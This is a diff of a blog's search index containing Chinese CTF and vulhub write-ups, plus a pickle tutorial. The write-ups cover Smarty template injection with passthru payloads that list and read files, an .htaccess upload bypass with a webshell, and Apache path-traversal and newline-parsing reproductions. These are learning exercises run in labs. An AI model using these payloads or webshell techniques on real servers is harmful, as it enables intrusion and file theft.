@@ -1,37 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>BJDCTF2020 The mystery of ip</title>
-    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和 <code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
-<p>发现有 <code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且 <code>hint.php</code> 源码中提示到 <code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到 <code>XFF</code>。</p>
-<h1 id="解题">解题</h1>
-<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
-<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup 才知道这里考的是模板注入。</p>
-<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
-<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
-<p>发现是 <code>smarty</code>。</p>
-<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
-<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
-<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
-<p>成功get。</p>
-<h1 id="总结">总结</h1>
-<ul>
-<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
-<li>要注意题目环境中的各种信息，比如这题中的题目想到 <code>XFF</code>。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUUCTF 2018 Online Tool</title>
     <url>/2022/03/22/BUUCTF%202018%20Online%20Tool/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -112,6 +81,75 @@
       </tags>
   </entry>
   <entry>
+    <title>BJDCTF2020 The mystery of ip</title>
+    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和 <code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
+<p>发现有 <code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且 <code>hint.php</code> 源码中提示到 <code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到 <code>XFF</code>。</p>
+<h1 id="解题">解题</h1>
+<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
+<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup 才知道这里考的是模板注入。</p>
+<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
+<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
+<p>发现是 <code>smarty</code>。</p>
+<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
+<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
+<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
+<p>成功get。</p>
+<h1 id="总结">总结</h1>
+<ul>
+<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
+<li>要注意题目环境中的各种信息，比如这题中的题目想到 <code>XFF</code>。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GXYCTF2019 BabyUpload</title>
+    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>打开环境可以很明显看到，这就是一个文件上传的题目。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
+<h1 id="过滤测试">过滤测试</h1>
+<h2 id="过滤类型测试">过滤类型测试</h2>
+<p>随便上传一个图片 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
+<p>根据提示 <code>上传类型</code> 推测应该需要修改 <code>Content-Type</code>，尝试 <code>image/gif</code> 和 <code>imag/jpeg</code> 后，发现后者是可以的。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
+<h2 id="过滤后缀测试">过滤后缀测试</h2>
+<p>将后缀修改为 <code>php</code> ，上传 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
+<p>经过多次尝试，发现我无法绕过这个过滤。此时思考，是否可以不用特定后缀又可以上传文件，想到了 <code>.htaccess</code> 。尝试一下发现成功！ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
+<p>记录一下地址 <code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>。之后，只要上传一个文件名为 <code>shell.jpg</code> 的木马即可。</p>
+<h2 id="文件内容过滤">文件内容过滤</h2>
+<p>写入一句话木马，然后上传，果不其然被过滤了。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
+<p>换一种写法发现还是不行 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
+<p>猜测过滤的应该是开头的那个 <code>php</code> 。因此，换一种写法，成功绕过。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
+<p>记录上传地址：<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
+<h1 id="蚁剑连接get-flag">蚁剑连接get flag</h1>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
+<p>flag在根目录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
+<p>成功。</p>
+<h1 id="总结">总结</h1>
+<ol type="1">
+<li>要熟悉常用的上传类型，题目中大多考察的是图片，因此要熟记：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>；</li>
+<li>当脚本后缀被过滤之后，并且无法绕过时，需要想到 <code>.htaccess</code>；</li>
+<li>文件内容的过滤，需要知道多种木马的写法。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GWCTF 2019 我有一个数据库</title>
     <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -151,44 +189,6 @@
       <tags>
         <tag>phpmyadmin 漏洞</tag>
         <tag>CVE-2018-12613</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>GXYCTF2019 BabyUpload</title>
-    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>打开环境可以很明显看到，这就是一个文件上传的题目。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
-<h1 id="过滤测试">过滤测试</h1>
-<h2 id="过滤类型测试">过滤类型测试</h2>
-<p>随便上传一个图片 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
-<p>根据提示 <code>上传类型</code> 推测应该需要修改 <code>Content-Type</code>，尝试 <code>image/gif</code> 和 <code>imag/jpeg</code> 后，发现后者是可以的。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
-<h2 id="过滤后缀测试">过滤后缀测试</h2>
-<p>将后缀修改为 <code>php</code> ，上传 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
-<p>经过多次尝试，发现我无法绕过这个过滤。此时思考，是否可以不用特定后缀又可以上传文件，想到了 <code>.htaccess</code> 。尝试一下发现成功！ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
-<p>记录一下地址 <code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>。之后，只要上传一个文件名为 <code>shell.jpg</code> 的木马即可。</p>
-<h2 id="文件内容过滤">文件内容过滤</h2>
-<p>写入一句话木马，然后上传，果不其然被过滤了。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
-<p>换一种写法发现还是不行 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
-<p>猜测过滤的应该是开头的那个 <code>php</code> 。因此，换一种写法，成功绕过。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
-<p>记录上传地址：<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
-<h1 id="蚁剑连接get-flag">蚁剑连接get flag</h1>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
-<p>flag在根目录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
-<p>成功。</p>
-<h1 id="总结">总结</h1>
-<ol type="1">
-<li>要熟悉常用的上传类型，题目中大多考察的是图片，因此要熟记：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>；</li>
-<li>当脚本后缀被过滤之后，并且无法绕过时，需要想到 <code>.htaccess</code>；</li>
-<li>文件内容的过滤，需要知道多种木马的写法。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -294,105 +294,6 @@
         <tag>RCE</tag>
         <tag>PHP</tag>
         <tag>git泄露</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pickle 库</title>
-    <url>/2022/01/30/pickle%20%E5%BA%93/</url>
-    <content><![CDATA[<p>pickle 库的简单使用。</p>
-<span id="more"></span>
-<h1 id="前言">前言</h1>
-<p>官方文档：<a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a></p>
-<h1 id="介绍">介绍</h1>
-<p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。</p>
-<h1 id="常用方法">常用方法</h1>
-<p>主要由两类接口，即序列化和反序列化。</p>
-<p>其中序列化包括： 1. dump() 2. dumps()</p>
-<p>反序列化包括： 1. load() 2. loads()</p>
-<p><strong>序列化后的对象是 bytes 类型的，反序列后的对象同样也是 bytes 类型的，也就是二进制文件。</strong></p>
-<h2 id="dump">dump</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>将对象 obj 序列化以后的对象写入已打开的 file object file。</p>
-</blockquote>
-<p>参数： 主要参数就是前两个： - obj：要序列化的对象 - file：序列化完之后的对象需要写入到 file 中。</p>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    pickle.dump(tar, f)</span><br></pre></td></tr></table></figure></p>
-<h2 id="dumps">dumps</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<p>参数： - obj：要序列化的对象 - 少了 file</p>
-<ul>
-<li>返回值 <strong>直接返回序列化后的二进制对象。（这是与 dump 最大的区别）</strong></li>
-</ul>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(tar))</span><br></pre></td></tr></table></figure></p>
-<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x05lihua\x94\x8c\x03age\x94K\x1eu.&#x27;</span><br></pre></td></tr></table></figure></p>
-<h2 id="load">load</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, protocol=<span class="literal">None</span>, fiximports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<p>参数： - file：要反序列的<strong>二进制文件</strong></p>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br></pre></td></tr></table></figure></p>
-<p>利用上面的 dump 的序列化后的二进制文件做演示，得到结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="loads">loads</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<p>参数： - data：需要反序列化的<strong>二进制对象</strong></p>
-<p>返回值： <strong>直接返回反序列化后的对象。（这是与 load 的最大区别）</strong></p>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">tars = pickle.dumps(tar)  <span class="comment"># 先序列化</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(tars)) <span class="comment"># 再反序列化</span></span><br></pre></td></tr></table></figure></p>
-<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>pickle</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）</title>
-    <url>/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
-<span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
-<ul>
-<li><p>版本等于2.4.49</p></li>
-<li><p>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</p></li>
-</ul>
-<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
-<p>参考链接：</p>
-<ul>
-<li><p>https://httpd.apache.org/security/vulnerabilities_24.html</p></li>
-<li><p>https://twitter.com/ptswarm/status/1445376079548624899</p></li>
-<li><p>https://twitter.com/HackerGautam/status/1445412108863041544</p></li>
-<li><p>https://twitter.com/snyff/status/1445565903161102344</p></li>
-</ul>
-<p>路径：</p>
-<ul>
-<li><code>vulhub-master/httpd/CVE-2021-41773</code></li>
-</ul>
-<p>运行漏洞环境：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build  </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
-<h1 id="复现">复现</h1>
-<p>进入环境，显示如下则环境搭建成功。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231656.png" /></p>
-<p>先刷新，抓个包，然后将请求地址修改为如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231754.png" /></p>
-<p>结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231803.png" /></p>
-<p>成功得到文件的内容，因此证明存在此漏洞。</p>
-<p>需要注意的是，<code>icons</code> 需要为目标主机存在且可访问的目录。<code>%2e</code> 是 <code>.</code> 的 url 编码，如果直接在浏览器输入的话，要输入 <code>.</code> 。</p>
-<p>接下来改变请求的方式，发送如下请求：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232016.png" /></p>
-<p>结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232026.png" /></p>
-<p>成功执行命令。</p>
-<h1 id="总结">总结</h1>
-<p>今天刷的一套题就是类似的路径穿越漏洞（<a href="https://buuoj.cn/challenges">BUUCTF</a> 中的 <strong>我有一个数据库</strong>），这类的题目还是需要平时多记录。</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Apache</tag>
       </tags>
   </entry>
   <entry>
@@ -649,88 +550,52 @@
       </tags>
   </entry>
   <entry>
-    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
-    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+    <title>pickle 库</title>
+    <url>/2022/01/30/pickle%20%E5%BA%93/</url>
+    <content><![CDATA[<p>pickle 库的简单使用。</p>
 <span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
-<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
-<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
-<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
-<h1 id="复现">复现</h1>
-<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
-<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
-<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
-<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
-<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
-<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
-<p>成功获得 webshell。</p>
-<h1 id="总结">总结</h1>
-<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
-<h1 id="资源">资源</h1>
-<ol type="1">
-<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
-<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
-</ol>
+<h1 id="前言">前言</h1>
+<p>官方文档：<a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a></p>
+<h1 id="介绍">介绍</h1>
+<p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。</p>
+<h1 id="常用方法">常用方法</h1>
+<p>主要由两类接口，即序列化和反序列化。</p>
+<p>其中序列化包括： 1. dump() 2. dumps()</p>
+<p>反序列化包括： 1. load() 2. loads()</p>
+<p><strong>序列化后的对象是 bytes 类型的，反序列后的对象同样也是 bytes 类型的，也就是二进制文件。</strong></p>
+<h2 id="dump">dump</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>将对象 obj 序列化以后的对象写入已打开的 file object file。</p>
+</blockquote>
+<p>参数： 主要参数就是前两个： - obj：要序列化的对象 - file：序列化完之后的对象需要写入到 file 中。</p>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    pickle.dump(tar, f)</span><br></pre></td></tr></table></figure></p>
+<h2 id="dumps">dumps</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>参数： - obj：要序列化的对象 - 少了 file</p>
+<ul>
+<li>返回值 <strong>直接返回序列化后的二进制对象。（这是与 dump 最大的区别）</strong></li>
+</ul>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(tar))</span><br></pre></td></tr></table></figure></p>
+<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x05lihua\x94\x8c\x03age\x94K\x1eu.&#x27;</span><br></pre></td></tr></table></figure></p>
+<h2 id="load">load</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, protocol=<span class="literal">None</span>, fiximports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>参数： - file：要反序列的<strong>二进制文件</strong></p>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br></pre></td></tr></table></figure></p>
